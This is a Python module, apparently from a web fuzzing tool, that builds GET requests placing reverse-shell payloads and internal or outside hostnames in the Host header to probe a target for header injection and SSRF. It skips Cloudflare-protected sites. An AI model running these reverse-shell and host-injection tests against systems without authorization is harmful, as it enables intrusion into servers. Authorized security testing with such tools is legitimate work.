from headers.static_values import *
from worker import *
from utils import *
import requests
import logging

class Host():

    def __init__(self, destination):
        self.destination       = destination
        self.mime_types        = MimeTypes.get_mime_list()
        self.payloads          = Payloads.get_payload_list(Config.revshell_ip, Config.revshell_port)
        self.test_array        = []

    def revshell_tests(self):
        for payload in self.payloads:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = payload,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Host" : payload
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def host_fuzz_tests(self):
        host_fuzz = [
            "0.0.0.0",
            "127.0.0.1",
            "localhost",
            "[::1]",
            "172.16.0.1",
            "172.17.0.1",
            "google.com",
            "facebook.com",
            "twitter.com"
        ]

        for host in host_fuzz:
            self.test_array.append(
                PreRequest(
                    req_type = "GET",
                    destination = self.destination,
                    payload = host,
                    headers = {
                        "User-Agent" : "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
                        "Host" : host
                    },
                    body = None,
                    expected_status_code = Config.initial_response.status_code
                )
            )

    def generate_tests(self):
        if Config.test_level >= Config.TEST_LEVEL_OPTIMAL:
            self.revshell_tests()
            self.host_fuzz_tests()

    def get_tests(self):
        response_headers = Config.initial_response.headers

        if 'Server' in response_headers and response_headers['Server'] == "cloudflare":
            logging.warning("CloudFlare protection detected, skipping Host header test...")
            print("<<===============================================================================>>")
            return []

        self.generate_tests()
        return self.test_array